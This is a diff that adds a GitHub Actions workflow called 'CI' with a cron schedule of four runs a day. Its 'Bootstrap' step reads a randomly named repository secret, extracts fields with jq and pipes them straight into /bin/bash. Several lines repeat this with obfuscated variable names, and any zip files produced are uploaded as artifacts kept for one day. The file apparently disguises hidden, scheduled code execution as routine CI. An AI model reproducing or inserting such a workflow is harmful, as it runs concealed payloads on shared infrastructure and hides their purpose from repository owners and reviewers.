@@ -1,0 +1,33 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '1 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          qaniu0: ${{ secrets.qaniu0 }}
+        run: |
+          printf '%s' "$qaniu0" | jq -r .zqj134 | /bin/bash
+          printf '%s' "$p14732" | jq -r .uafwt24916 | /bin/bash
+          echo $cbakk7225 | jq -r .euya8 | /bin/bash
+          echo $osidz9686 | jq -r .mkze41 | /bin/bash
+          printf '%s' "$yz9853" | jq -r .qwbk09151 | /bin/bash
+          printf '%s' "$kixj574" | jq -r .wgak69 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Rhhq1vd3
+          path: "*.zip"
+          retention-days: 1
